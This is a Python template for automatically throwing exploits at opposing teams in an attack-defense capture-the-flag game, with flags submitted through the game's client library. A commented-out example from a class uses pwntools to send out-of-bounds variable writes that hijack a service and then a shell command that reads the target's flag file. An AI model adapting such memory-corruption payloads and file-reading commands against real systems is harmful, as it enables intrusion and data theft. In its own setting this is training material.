#!/usr/bin/env python

import swpag_client
import pwn

URL = "<INSERT DURING CTF AND COMMIT>"
TEAM_URL = "http://" + URL + "/"
TEAM_FLAG_TOKEN = "<INSERT DURING CTF AND COMMIT>"
SERVICE_ID = 1 # Update for each exploit to target the correct service
EXCLUDE_TEAM_NAME = "Team 31"

def module_name():
  return "template-exploit"

def module_help():
  return "a template exploit to be thrown by the auto-runner module"

def module_usage():
  return "{0}".format(module_name())

def main():
  try:
    team = swpag_client.Team(TEAM_URL, TEAM_FLAG_TOKEN)
    
    for target in team.get_targets(1): #"1" is the currently targeted service. Need to edit accrodingly (team..get_service_list() if you need a starting place)
      # Ignore our own team
      if (target["team_name"] == EXCLUDE_TEAM_NAME):
        continue

      flag_id = target["flag_id"]
      hostname = target["hostname"]
      port = target["port"]
      flag_obtained = None
      
      print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))
      # Put exploit here and (hopefully) update the "flag_obtained" variable above!
      
      ''' This is the example from class live event, utilizing pwntools
      r = pwn.remote(hostname, 10001)
		  r.recvuntil("username:")
		  r.send("sh\n")
		  r.recvuntil("password:")
		  r.send("pwned\n")
		  r.recvuntil("work:")
		  r.send("pwned\n")
		  r.recvuntil("result")
		  r.send("S\n")
		  r.recvuntil("end\n")
		  r.send("V0=V-8+0\n")
		  r.send("V1=V0+10641\n")
		  r.send("V2=V0+130\n")
		  r.send("V-1073741792=V2+0\n")
		  r.send("V-1073741791=V1+0\n")
		  r.send("\n")
		
		  r.send("cat /home/chall/service/rw/"+ flag_id + "_*")
		  flag_obtained = r.read(4096).split("\n")[0]
      Don't forget in your exploit to include logic for offline services (so it doesn't hang forever) and patched services
      '''
      
      
      if (flag_obtained is not None):
        print(team.submit_flag([flag_obtained]))
      
  except Exception as e:
    print(e)

if __name__ == "__main__":
  main()
